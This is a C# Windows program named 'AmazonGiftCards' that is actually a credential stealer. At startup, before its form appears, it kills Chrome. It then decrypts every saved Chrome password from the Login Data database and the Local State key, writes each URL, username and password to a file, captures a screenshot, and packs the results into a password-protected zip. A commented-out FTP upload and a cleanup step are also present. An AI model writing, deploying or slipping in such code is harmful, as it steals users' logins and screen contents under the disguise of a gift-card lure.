using Ionic.Zip;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Data.SQLite;

namespace AmazonGiftCards
{
    static class Program
    {
        [DllImport("User32.Dll", EntryPoint = "PostMessageA")]
        private static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            LaunchCommandLineApp();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        static void LaunchCommandLineApp()
        {
            string folderName = @"\gotYa\";
            string fileName = Environment.UserName;
            string date = DateTime.UtcNow.ToString("yyyyMMdd");
            Directory.CreateDirectory(folderName);

            Process[] processlist = Process.GetProcessesByName("chrome");
            if (processlist.Length != 0)
            {
                foreach(Process process in processlist)
                {
                    process.Kill();
                }
            }


            //Taken from https://github.com/simpleperson123/ChromeDecryptor

            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string LoginDataPath = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";

            byte[] key = GetKey();

            string connectionString = String.Format("Data Source={0};Version=3;", LoginDataPath);

            SQLiteConnection conn = new SQLiteConnection(connectionString);
            conn.Open();

            List<Credential> creds = new List<Credential>();

            SQLiteCommand cmd = new SQLiteCommand("select * from logins", conn);
            SQLiteDataReader reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                byte[] encryptedData = (byte[])reader["password_value"];
                if (IsV10(encryptedData))
                {
                    byte[] nonce, ciphertextTag;
                    Prepare(encryptedData, out nonce, out ciphertextTag);
                    string password = Decrypt(ciphertextTag, key, nonce);
                    creds.Add(new Credential
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
                else
                {
                    string password;
                    try
                    {
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        password = "Decryption failed :(";
                    }
                    creds.Add(new Credential
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
            }

            using StreamWriter file = new($"{folderName}{fileName}-{date}.txt", append: true);

            foreach (Credential cred in creds)
            {
                file.WriteLine($"URL: {cred.url}{Environment.NewLine}USERNAME: {cred.username}{Environment.NewLine}PASSWORD: {cred.password}{Environment.NewLine}");
            }




            //take screenshot
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                bitmap.Save($"{folderName}{fileName}-{date}.jpg", ImageFormat.Jpeg);
            }

            //zip and encrypt files with password
            using (ZipFile zip = new ZipFile())
            {
                zip.Password = "thisisacoolapassdaweaweasdasdfja;oirtaowlirgjloaikrgloiwkrejowiaejaoweijtf";
                zip.AddDirectory(folderName);
                zip.Save($"{folderName}{fileName}-{date}.zip");
            }


            //upload to a public FTP server
            //using (var client = new WebClient())
            //{
            //    client.Credentials = new NetworkCredential("user", "password");
            //    client.UploadFile($"ftp://192.168.0.208:21/{fileName}-{date}.zip", WebRequestMethods.Ftp.UploadFile, $"{folderName}{fileName}-{date}.zip");
            //}

 
            //delete the folder
            //Directory.Delete(folderName, true);

        }

        static bool IsV10(byte[] data)
        {
            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        //Gets the key used for new AES encryption (from Chrome 80)
        static byte[] GetKey()
        {
            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string FilePath = localappdata + "\\Google\\Chrome\\User Data\\Local State";
            string content = File.ReadAllText(FilePath);
            dynamic json = JsonConvert.DeserializeObject(content);
            string key = json.os_crypt.encrypted_key;
            byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
            byte[] decryptedkey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);

            return decryptedkey;
        }

        //Gets cipher parameters for v10 decryption
        public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        //Decrypts v10 credential
        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            string sR = string.Empty;
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception ex)
            {
                return "Decryption failed :(";
            }

            return sR;
        }

    }


}
